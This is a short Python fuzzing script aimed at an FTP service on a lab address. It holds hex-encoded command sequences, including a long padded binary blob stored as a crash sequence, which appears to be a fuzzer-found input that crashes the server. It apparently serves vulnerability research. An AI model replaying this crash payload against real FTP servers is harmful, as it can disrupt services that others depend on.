#!/usr/bin/python
# -*- coding: UTF-8 -*-

from cpf.fuzzer.TCPFuzzer import TCPFuzzer

if __name__ == '__main__':

    fuzzer = TCPFuzzer(host="192.168.245.131", port=21,
                       nomal_trans_conf="../conf/float_ftp.json",
                       logseq_count=3, interval=0.1)

    relay = True

    if not relay:
        fuzzer.fuzz()
    else:

        trans = [[{"recv": "50617373776f7264207265717569726564",
                   "send": "5553460d0e40650d53464f20667365650d4b60607365650d0e40650d53464f20667365650d"}], [
                     {"recv": "50617373776f7264207265717569726564",
                      "send": "5520202020202020202020202020202020f47e63e131a3abf3f8381cb5f351531951f46b6919e1838beb85e28c53e11e3434a1c80573ea20202020202020202020202020202020202020202020202020202020202020202020202020202020c7428f6565c9abf3f8381cb5f351531951f46b6919e1838beb85e28c53e11e3434a1c80573ea2020202020202020202020202020202020202020f47e63e131a3abf3f8381cb5f351531951f46b6919e1838bebffffffffffffffffa1c80573ea20202020202020202020202020202020202020202020202020202020202020202020202020202020c7428f6565c9abf3f8381cb5f351531951f46b6919e1838beb85e28c53e11e3434a1c80573ea20202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020c7428f34a1c80573ea20202020202020202020202020202020202020202020202020202020202020202020202020202020c7428f6565c925e5f8381cb5f351531951f46b6919e1838beb85e28c53e11e3434a1c8715d0be7ee807849e80627bb3268567d9957448abd0a638c3797cc0cadad8b2eaf2b700e82f8a6be8dae9c521f7762456fdf6f7745df277b6a55eb73d23ec3707fc5c7e734a5685b12559eb01cd81b81e0656212ac7451be138f9a3ff833157bdcfb64dc7bc8bfe2205e5724b844df3c70f7d04fb84a9e90976bc26137bcc553849f79ea9cccabe7f9cd626e0c4c463eeb1cae10a82431df196040bf2e937685c76d6a7c416a479077275cf0a21b97c764a891de371e56cf46eb1dfeb161331ced5afda5f85aee9dee7c1e0e368846e1d87eee98afe9fe74d9ab620fd583301609016bcdb19fc1adb6b9b96aac35067cd96ad1d055751a7318a2e6dac7f73507c64648bca13ef4b695e3e7f38faa57ff3e7d92c59ebe9ce31434884feca11ace6e642154b60d34ee1251e6ef0613b92d9158ea2a40081d1ec1f19c0fcae8bd94b01c76b58a7f46081c420f2b994ad49e6904143ec4a32dfcd3b079744774c71c9b020fc9b3ce70a781c205e09d4a883fa5939ac690ce722ecaa8e6d19c15050f0412ffee957ec47acaf2f27c36efdb5bdfba28b2108b07dc62b56de123e061a1262b8bbc113b79c1f2897d61c158ce88fce66ac845f2b339663159266650d5ba23f5dd7752325ac3749e27f348beb237673bace2a604d011923b04b0f00702f6fec9ee998c5601afe5db7726e90c81151151ee04a589f701871e05df3d4b7e6c5303330b79e4b659a8cd566514c95137bcc3b5e017e3b9b0c14d8ad444226dfc5211d844b86a374d438650b97b5c03020e9a03ed6b1d79e81ee840093af0b8f3cf5617fa7e6a29d1efd595a77641d00c60488253d4d6f06e37c2a3a83d03e0512f05964259c1a467653695e6a026fc9fe6fcb07c961510ff676937d27a0e43f664927a50eb392c788e32390d667f190b8f6098d050644e37674721d4c07be9911c15ddacc21299f82970ae8400cd5345f0ca0caba9cf2a6f5ea31ab3089f51ada4a90aecd1d6823d5e944d4645b51c809da2953f2e3dd5515c2ddb666defa17922217d7f9f23a036199dd26db96520202020202020202020202020c7428f6565c9abf3f8381cb5f351531951f46b6919e1838beb85e28c53e11e3434ddb7255cea202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020"}],
                 [{"recv": "50617373776f7264207265717569726564", "send": "0d05"}]]

        crash_seqs = [{'recv': '50617373776f7264207265717569726564',
                       'send': '5520202020202020202020202020202020f47e63e131a3abf3f8381cb5f351531951f46b6919e1838beb85e28c53e11e3434a1c80573ea20202020202020202020202020202020202020202020202020202020202020202020202020202020c7428f6565c9abf3f8381cb5f351531951f46b6919e1838beb85e28c53e11e3434a1c80573ea2020202020202020202020202020202020202020f47e63e131a3abf3f8381cb5f351531951f46b6919e1838bebffffffffffffffffa1c80573ea20202020202020202020202020202020202020202020202020202020202020202020202020202020c7428f6565c9abf3f8381cb5f351531951f46b6919e1838beb85e28c53e11e3434a1c80573ea20202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020c7428f34a1c80573ea20202020202020202020202020202020202020202020202020202020202020202020202020202020c7428f6565c925e5f8381cb5f351531951f46b6919e1838beb85e28c53e11e3434a1c8715d0be7ee807849e80627bb3268567d9957448abd0a638c3797cc0cadad8b2eaf2b700e82f8a6be8dae9c521f7762456fdf6f7745df277b6a55eb73d23ec3707fc5c7e734a5685b12559eb01cd81b81e0656212ac7451be138f9a3ff833157bdcfb64dc7bc8bfe2205e5724b844df3c70f7d04fb84a9e90976bc26137bcc553849f79ea9cccabe7f9cd626e0c4c463eeb1cae10a82431df196040bf2e937685c76d6a7c416a479077275cf0a21b97c764a891de371e56cf46eb1dfeb161331ced5afda5f85aee9dee7c1e0e368846e1d87eee98afe9fe74d9ab620fd583301609016bcdb19fc1adb6b9b96aac35067cd96ad1d055751a7318a2e6dac7f73507c64648bca13ef4b695e3e7f38faa57ff3e7d92c59ebe9ce31434884feca11ace6e642154b60d34ee1251e6ef0613b92d9158ea2a40081d1ec1f19c0fcae8bd94b01c76b58a7f46081c420f2b994ad49e6904143ec4a32dfcd3b079744774c71c9b020fc9b3ce70a781c205e09d4a883fa5939ac690ce722ecaa8e6d19c15050f0412ffee957ec47acaf2f27c36efdb5bdfba28b2108b07dc62b56de123e061a1262b8bbc113b79c1f2897d61c158ce88fce66ac845f2b339663159266650d5ba23f5dd7752325ac3749e27f348beb237673bace2a604d011923b04b0f00702f6fec9ee998c5601afe5db7726e90c81151151ee04a589f701871e05df3d4b7e6c5303330b79e4b659a8cd566514c95137bcc3b5e017e3b9b0c14d8ad444226dfc5211d844b86a374d438650b97b5c03020e9a03ed6b1d79e81ee840093af0b8f3cf5617fa7e6a29d1efd595a77641d00c60488253d4d6f06e37c2a3a83d03e0512f05964259c1a467653695e6a026fc9fe6fcb07c961510ff676937d27a0e43f664927a50eb392c788e32390d667f190b8f6098d050644e37674721d4c07be9911c15ddacc21299f82970ae8400cd5345f0ca0caba9cf2a6f5ea31ab3089f51ada4a90aecd1d6823d5e944d4645b51c809da2953f2e3dd5515c2ddb666defa17922217d7f9f23a036199dd26db96520202020202020202020202020c7428f6565c9abf3f8381cb5f351531951f46b6919e1838beb85e28c53e11e3434ddb7255cea202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020'}]

        # fuzzer.replay(crash_seqs)
        for seqs in trans:
            if fuzzer.check_vuln(seqs):
                print seqs
                exit(0)
